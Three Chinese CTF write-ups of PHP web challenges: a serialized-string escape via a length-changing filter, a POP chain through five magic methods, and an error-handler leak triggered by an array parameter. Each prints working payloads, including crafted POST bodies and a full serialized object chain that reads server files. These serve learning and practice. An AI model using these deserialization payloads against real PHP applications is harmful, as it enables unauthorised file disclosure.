    [安洵杯 2019] easy_serialize_php — 长度声明是过滤前算的

    题目类型：PHP 反序列化 — 序列化字符串逃逸（长度变化）

    Flag：CTF2{dad89ab0-9990-4063-bc5a-fabbcc9cb29e}

    题目概述

    页面就一句 source_code 链接，点进去是源码。这题的坑不在链子，在长度。

    解题过程

    Step 1：读源码，先找 sink

    function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;
extract($_POST);

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();');
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}

    能读文件的是 show_image 分支：

    $userinfo = unserialize($serialize_info);
echo file_get_contents(base64_decode($userinfo['img']));

    所以目标是：让 $userinfo['img'] 等于某个文件路径的 base64。

    Step 2：为什么不能直接改 img

    $_SESSION['img'] 在两个分支里都被无条件赋值，而且是在 extract($_POST) 之后：

    if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

    所以你 POST 里传的 img 会被覆盖掉；sha1() 的输出又永远是 40 位十六进制，注入不进去任何结构。

    这条路封死。真正的入口是 filter()——它会把序列化串里的 php、flag 删掉。

    Step 3：错位从这里开始

    serialize() 里的长度声明是按过滤前的内容算的，但 filter() 之后内容变短了：

    序列化：s:7:"phpflag";     ← 声明读 7 个字节
过滤后：s:7:"";            ← 内容被删光，0 个字节

    解析器不会报错，它按规则从引号后面数 7 个字节——数到的是后面那段内容。

    这就是“逃逸”：长度声明和实际内容不匹配，解析器多读的那部分，变成了下一个结构。

    Step 4：我把 payload 放错了位置（三次错）

    ① 填充放在值里——废

    我把 php 重复十几次塞进 user 的值里，想让 filter 删掉它们。结果：**

    过滤前: s:4:"user";s:89:"guestphpphp…php";}s:3:"img";…"
过滤后: s:4:"user";s:89:"guest";}s:3:"img";…"
                     └ 声明 89，实际只剩 47 ┘

    解析器从 guest 往后数 89 个字节，把我写的 ";}s:3:"img";... 全算进了 user 的值里——我写的结构一次都没被当成结构，只是被当成字符。unserialize 返回 false。

    ② 填充放在键名里——对

    键名的写法也是 s:N:"键名"，同样有长度声明，同样会被删：

    过滤前: s:7:"phpflag";s:48:";s:1:"1";s:3:"img";s:20:"ZDBn…";}"
过滤后: s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBn…";}"

    这次断的是键名和值的交界处，值本身是完整的。解析器从值里借 7 个字节当键名，剩下的部分就变成了新的结构。

    ③ 还手写过整条序列化串——那也是错的

    这题不需要你写序列化串。serialize($_SESSION) 是服务器自己做的。我一开始写成这样：

    O:7:"Session":3:{s:4:"user";…}

    两个问题：

    O: 是对象格式，$_SESSION 是数组，应该是 a:
没有 Session 这个类 → 变成 __PHP_Incomplete_Class → 后面不能当数组用

    你的 payload 只是 POST 里的一个字符串值。

    Step 5：参数名也写错了

    我写的是 $_SESSION['flag']=...——这是 PHP 语法，不是 HTTP 参数名。

    HTTP 里要写：

    _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}

    注意这里没有 $、没有单引号。

    Step 6：一个意外发现——数组只剩 2 个元素

    extract($_POST) 把 _POST['_SESSION'] 这个数组整体赋给了 $_SESSION，不是往里面加键，而是整个替换掉。

    所以服务器真正的序列化串是：

    a:2:{s:7:"phpflag";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}

    只有 2 个元素：我的键 + img。user 和 function 已经不存在了。

    这也解释了那个 ;s:1:"1"; 是干什么的——占一个元素的位置，让解析出来的元素数正好等于 a:2: 声明的 2 个。

    Step 7：逐字节看解析过程

    过滤后的串：

    a:2:{s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}

    解析器这样走：

    ① a:2:{                    → 要读 2 组键值对
② 读第 1 组的键:  s:7  →  从引号后数 7 个字节 = '";s:48:'
③ 读第 1 组的值:  s:1  →  读 1 个字节 = '1'
④ 读第 2 组的键:  s:3  →  'img'
⑤ 读第 2 组的值:  s:20 →  'ZDBnM19mMWFnLnBocA=='
⑥ 读到 '}'，结束。后面那段"真正的 img"被丢弃

    最终：$userinfo['img'] = 'ZDBnM19mMWFnLnBocA=='。

    第一步最关键：phpflag 被删光，但 s:7 的声明还在，解析器不会“觉得不对”，它只是从下一个字节开始数 7 个。

    Step 8：读文件

    ZDBnM19mMWFnLnBocA== 解出来是 d0g3_f1ag.php：

    file_get_contents(base64_decode('ZDBnM19mMWFnLnBocA=='))
→ <?php $flag = 'flag in /d0g3_fllllllag'; ?>

    真正的 flag 在 /d0g3_fllllllag，重新算 base64：

    /d0g3_fllllllag  →  L2QwZzNfZmxsbGxsbGFn

    再发一次：

    POST _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
GET  ?f=show_image

    CTF2{dad89ab0-9990-4063-bc5a-fabbcc9cb29e}

    解题思路总结

    读源码 → sink 在 show_image：unserialize + base64_decode + file_get_contents
       → img 被代码无条件覆盖，注入不进去
         → 突破口：filter 会删 php/flag，让长度声明和内容不匹配
           → 填充放在"值"里 → 解析器把后面的结构一起吞掉（失败）
             → 填充放在"键名"里 → 断点落在键名/值交界，落点可控（成功）
               → 补一个假元素 ;s:1:"1"; 让元素数对上 a:2
                 → 读出 d0g3_f1ag.php → 里面写着真实路径 → 再来一次

    漏洞原理

    ① 长度声明是“过滤前”算的

    serialize() 生成的 s:N:"..." 是按当时内容的长度算的；filter() 改了内容，N 却不会变。

    解析器只认 N：它从引号后精确数 N 个字节。内容短了，它就多读到后面的东西——多读的部分被当成新结构。

    ② 错位点在哪，决定了你能不能控制

    填充在值里   →  值本身断裂，后面全被当字符吞掉  →  不可控
填充在键名里 →  值完整，断点落在"键名结束 → 值开始"  →  可控

    ③ extract() 同名会整体替换

    _POST['_SESSION'] 是数组，extract 会把它整个赋给 $_SESSION，不是合并。所以 user、function 消失了，数组只剩你的键和 img。**

    这也是为什么 a:2——不是 3。

    关键知识点

    知识点 说明
    序列化逃逸 s:N:"..." 的 N 是过滤前算的，内容变短后解析器会多读
    填充位置 放键名可控，放值里会把你的结构一起吞掉
    ;s:1:"1"; 假元素，用来把元素数凑回 a:N 声明的数量
    元素数必须对上 解析出来的键值对数与 a:N 不符 → unserialize 返回 false
    extract() 同名键是整体替换，不是合并
    数组 vs 对象 $_SESSION 是数组用 a:，O: 是对象，混用会变 __PHP_Incomplete_Class
    HTTP 参数写法 _SESSION[键]=值，不写 $、不写引号
    二次读取 读到的文件里可能还写着真正的 flag 路径
    完整 payload 
    GET  /index.php?f=show_image

POST _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
→ 返回 d0g3_f1ag.php 的内容：$flag = 'flag in /d0g3_fllllllag';

POST _SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
→ CTF2{dad89ab0-9990-4063-bc5a-fabbcc9cb29e}
    这题踩的坑

    ① 填充放在值里

    最常见的错。看起来"filter 会删掉填充，所以后面就对齐了"——恰恰相反：填充被删掉只会让声明比内容更长，多出来的长度把后面的一切都吃掉。

    ② 手写整条序列化串

    这题服务器自己 serialize()，你交的只是一个值。行首的 a:2: 是它数出来的，不是你写的。

    ③ $_SESSION['flag']= 当参数名

    那是 PHP 语法。HTTP 里是 _SESSION[flag]=。

    ④ 以为数组有 3 个元素

    extract 是整体替换，user/function 早没了，只剩 2 个。

    [NewStarCTF] UnserializeOne — 五个魔术方法串成一条链

    题目类型：PHP 反序列化 — POP 链构造（魔术方法连环触发）

    Flag：CTF2{a3ae15bd-2047-4dd5-b9b3-c0dccb22c632}

    题目概述

    给一份源码，入口就一句：

    if(isset($_POST['pop'])){
    unserialize($_POST['pop']);
}

    四个类：Start、Sec、Easy、eeee，各带魔术方法。任务是拼一条从 unserialize 走到 file_get_contents('/flag') 的链。

    解题过程

    Step 1：先找终点——flag 在哪被读出来

    class Sec{
    public function __invoke()
    {
        echo file_get_contents('/flag');
    }
}

    终点在 Sec::__invoke()。

    __invoke 的触发条件：把一个对象当成函数来调用，也就是 $obj()。

    Step 2：谁会把对象当函数调用

    class Start{
    public function __isset($var)
    {
        ($this->func)();
    }
}

    ($this->func)() —— 这就是“把 $this->func 当函数调用”。只要 $this->func 是一个 Sec 对象，就会走到 Sec::__invoke。

    所以现在要找：__isset 怎么被触发。

    __isset 的触发条件：对不可访问或不存在的属性调用 isset()（或 empty()）。

    Step 3：谁会对不存在的属性调用 isset

    class eeee{
    public $obj;
    public function __clone()
    {
        if(isset($this->obj->cmd)){
            echo "success";
        }
    }
}

    isset($this->obj->cmd) —— 如果 $this->obj 是个 Start 对象，而 Start 里没有 cmd 这个属性，这就是“对不存在的属性调用 isset”，正好触发 Start::__isset。

    所以 eeee->obj 要指向一个 Start，而那个 Start 的 func 要指向一个 Sec。

    下一个问题：__clone 怎么触发？

    Step 4：谁在 clone 对象

    class Easy{
    public $cla;
    public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
}

    clone $var[0] —— 直接触发被 clone 对象的 __clone。

    __call 的触发条件：调用了对象上不存在的方法。

    Step 5：谁调用了不存在的方法

    class Sec{
    public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }
}

    $this->obj->check($this->var) —— check 这个方法四个类里都没有，所以只要 $this->obj 是 Easy，就会触发 Easy::__call，而且第一个参数正好是 $this->var（也就是我们要 clone 的那个 eeee 对象）。

    __toString 的触发条件：对象被当成字符串使用。

    Step 6：谁把对象当字符串用了

    class Start{
    public function __destruct()
    {
        echo "Welcome to NewStarCTF, ".$this->name;
    }
}

    字符串拼接 "..." . $this->name —— 如果 $this->name 是个 Sec 对象，就会触发 Sec::__toString。

    而 __destruct 是对象被销毁时自动调用——反序列化出来的对象在脚本结束时都会析构，所以这里是天然的起点。

    完整链条

    unserialize 结束、脚本运行完毕
  → Start::__destruct()            对象销毁自动触发
    → 字符串拼接 $this->name
      → Sec::__toString()          对象被当字符串用
        → $this->obj->check(...)   调用不存在的方法
          → Easy::__call()         不存在的方法被调用
            → clone $var[0]        克隆对象
              → eeee::__clone()    对象被 clone
                → isset($this->obj->cmd)   不存在的属性
                  → Start::__isset()       对不存在的属性 isset
                    → ($this->func)()      对象当函数调用
                      → Sec::__invoke()    对象当函数
                        → file_get_contents('/flag')

    五个魔术方法，一层扣一层，最后落在读文件上。

    Payload

    O:5:"Start":2:{
  s:4:"name";O:3:"Sec":2:{
    s:3:"obj";O:4:"Easy":1:{s:3:"cla";N;}
    s:3:"var";O:4:"eeee":1:{
      s:3:"obj";O:5:"Start":2:{
        s:4:"name";N;
        s:4:"func";O:3:"Sec":2:{s:3:"obj";N;s:3:"var";N;}
      }
    }
  }
  s:4:"func";N;
}

    压成一行：

    O:5:"Start":2:{s:4:"name";O:3:"Sec":2:{s:3:"obj";O:4:"Easy":1:{s:3:"cla";N;}s:3:"var";O:4:"eeee":1:{s:3:"obj";O:5:"Start":2:{s:4:"name";N;s:4:"func";O:3:"Sec":2:{s:3:"obj";N;s:3:"var";N;}}}}s:4:"func";N;}

    POST 参数名 pop，值就是上面那串。

    这个 payload 的结构对照

    外层 Start
  name → Sec          ← __destruct 拼字符串时触发 __toString
    obj  → Easy       ← __toString 里调 check()，触发 __call
    var  → eeee       ← __call 里 clone 的第一个参数
             obj → Start   ← __clone 里 isset($obj->cmd)，触发 __isset
                     func → Sec   ← __isset 里 ($this->func)()，触发 __invoke
  func → N            ← 外层 Start 自己的 func，用不到，给 null 即可

    解题思路总结

    从能读 flag 的地方倒推：
  file_get_contents  → Sec::__invoke
    ← 谁把对象当函数调用？  Start::__isset 的 ($this->func)()
      ← 谁触发 __isset？    eeee::__clone 的 isset($this->obj->cmd)
        ← 谁触发 __clone？  Easy::__call 的 clone $var[0]
          ← 谁触发 __call？ Sec::__toString 的 $this->obj->check()
            ← 谁触发 __toString？ Start::__destruct 的字符串拼接

    每一步都在问同一个问题：要走到下一步，得先满足什么条件？——然后去别的类里找满足这个条件的地方。

    漏洞原理

    ① 魔术方法 = 自动触发的“钩子”

    PHP 在很多操作上埋了钩子：对象销毁、被当字符串、被当函数、访问不存在的属性、调用不存在的方法、被 clone……开发者通常不知道这些钩子会在什么时候被调用。

    ② 只要链上每一环的属性都可控，就能拼出一条执行路径

    unserialize 允许攻击者指定属性的类型和内容——一个字符串可以变成对象、对象可以变成另一个类的对象。于是本来毫无关系的四个类，被拼成了一条完整的调用链。

    这就是 POP 链（Property-Oriented Programming）：不执行代码，只摆对象，让程序自己走过去。**

    ③ 最终的 sink 是 file_get_contents('/flag')

    链子本身不做坏事，它只是把执行流送到那个能读文件的方法里。

    关键知识点

    魔术方法 触发条件
    __destruct() 对象被销毁（脚本结束时自动调用）
    __toString() 对象被当成字符串使用（拼接、echo、比较）
    __call($name,$args) 调用了不存在的方法
    __clone() 对象被 clone 时
    __isset($name) 对不存在/不可访问的属性调用 isset() 或 empty()
    __invoke() 对象被当成函数调用，如 $obj()
    属性可见性：protected / private 的写法不一样

    本题源码里四个类的属性在页面截图上都是 public，所以直接写属性名就行。

    但如果遇到 protected 或 private，序列化串里的名字要带前缀，而且长度要把前缀算进去：

    public     s:4:"name";          直接写名字
protected  s:7:"\0*\0name";     前面是 \0 + * + \0，共 3 字节前缀
private    s:10:"\0Sec\0name";  前面是 \0 + 类名 + \0

    本地构造时要按目标类的真实可见性来写，否则反序列化出来的属性是“同名但不是同一个”，魔术方法里读到的会是你没设置的那个。

    这题踩的坑

    ① 起点不要从某个类硬找

    这题的起点是 __destruct——它不需要任何操作就会触发，所以从“谁最先被自动调用”往回推，比从入口 unserialize 正着推更快。

    ② 把它当成“倒推题”而不是“写代码题”

    链子上每一环的答案都藏在别的类里，不需要写新代码，只需要摆对象。

    ③ 本地搭一份再改

    把四个类复制到本地 PHP 里，用 serialize() 生成基础串，再对着改属性——比自己手数括号可靠得多。

    [CTF2] EZPHP — 条件永远为假，但错误处理器会说话

    题目类型：Web — PHP 代码审计，利用 set_error_handler 触发信息泄露

    Flag：CTF2{558d08e2-3e2c-43bc-be5b-6058c095641b}

    题目概述

    页面给了一段 PHP 源码（highlight_file(__FILE__) 把自身打印出来），底下永远显示 Try harder!。

    解题过程

    Step 1：先读代码

    <?php
highlight_file(__FILE__);
include "fl4g.php";
$dest0g3 = $_POST['ctf'];
$time    = date("H");
$timme   = date("d");
$timmme  = date("i");

if(($time > "24") or ($timme > "31") or ($timmme > "60")){
    echo $fl4g;
}else{
    echo "Try harder!";
}

set_error_handler(
    function() use(&$fl4g) {
        print $fl4g;
    }
);
$fl4g .= $dest0g3;
?>

    Step 2：第一个想法——绕开那个 if

    include 已经把 fl4g.php 引进来了，那直接让 if 成立不就能输出 $fl4g 了吗？

    看三个判断：

    date("H")   小时   00–23     永远不可能 > 24
date("d")   日期   01–31     永远不可能 > 31
date("i")   分钟   00–59     永远不可能 > 60

    三个都是“边界值本身等于上限”的情况，所以整条 or 永远是假。这条路封死。

    Step 3：真正的入口在下面

    set_error_handler(function() use(&$fl4g){ print $fl4g; });
$fl4g .= $dest0g3;

    set_error_handler 注册了一个自定义处理器——只要发生能被它捕获的错误，就会执行里面的 print $fl4g。

    而下一行就是触发器：$fl4g .= $dest0g3。

    Step 4：让拼接出错

    $dest0g3 来自 $_POST['ctf']，类型完全由我们决定。

    如果传一个字符串，拼接正常，什么都不会发生。

    如果传一个数组，PHP 试图把数组转成字符串来拼接，转不了——抛出 Warning: Array to string conversion。

    这个 warning 被刚刚注册的处理器捕获，于是 print $fl4g 执行，flag 就出来了。

    POST ctf[]=1
→ Array to string conversion
→ error handler
→ 打印 $fl4g

    解题思路总结

    读源码 → include 了 fl4g.php，但 if 永远为假（小时≤23、日≤31、分≤59）
       → 往下看，set_error_handler 注册了 print $fl4g
         → 找触发器：$fl4g .= $_POST['ctf']
           → 传数组 → 拼接失败 → warning → 处理器执行 → 拿到 flag

    漏洞原理

    ① 错误处理器会把“错误”变成“输出”

    set_error_handler 本来是用来记日志、兜异常的，但它注册的回调里做了什么，就是另一回事。这题的回调里是 print $fl4g——等于把“出错”这个事件接了一根线到“泄露变量”上。

    ② 数组与字符串拼接会抛 warning

    PHP 允许很多隐式类型转换，但数组转字符串不在其中。$str .= $array 不会静默失败，它会抛 Array to string conversion。

    这个 warning 默认是不致命的，页面照常返回——但 set_error_handler 能接住它。

    ③ 参数类型可控，是最容易被忽略的输入面

    $_POST['ctf'] 不一定是字符串。在表单里写成 ctf[]=1，PHP 就会把它解析成数组。很多开发者的防御只考虑了“值”，没考虑“类型”。

    关键知识点

    知识点 说明
    date("H") / "d" / "i" 小时 00–23、日 01–31、分 00–59，与判断边界相同，永远不可能大于
    set_error_handler 注册自定义错误处理函数，可捕获 warning/notice
    Array to string conversion 数组与字符串拼接时抛出的 warning，被处理器接住
    ctf[]=1 表单里这样写，后端 $_POST['ctf'] 就是数组
    use (&$fl4g) 引用捕获，让闭包能读到外部变量
    完整源码 
    <?php
highlight_file(__FILE__);
include "fl4g.php";
$dest0g3 = $_POST['ctf'];
$time    = date("H");
$timme   = date("d");
$timmme  = date("i");
if(($time > "24") or ($timme > "31") or ($timmme > "60")){
    echo $fl4g;
}else{
    echo "Try harder!";
}
set_error_handler(
    function() use(&$fl4g) {
        print $fl4g;
    }
);
$fl4g .= $dest0g3;
?>
    这题踩的坑

    ① 一开始死磕那个 if

    三个条件都卡在边界上（≤23、≤31、≤59），不是“运气不好没凑上”，是设计上就不可能。看到这种精度边界，就该立刻换路。

    ② 把 warning 当成“不影响”

    warning 确实不中断脚本，但这题的整个入口就在“warning 会被谁接住”上。错误级别不重要，谁在处理它才重要。
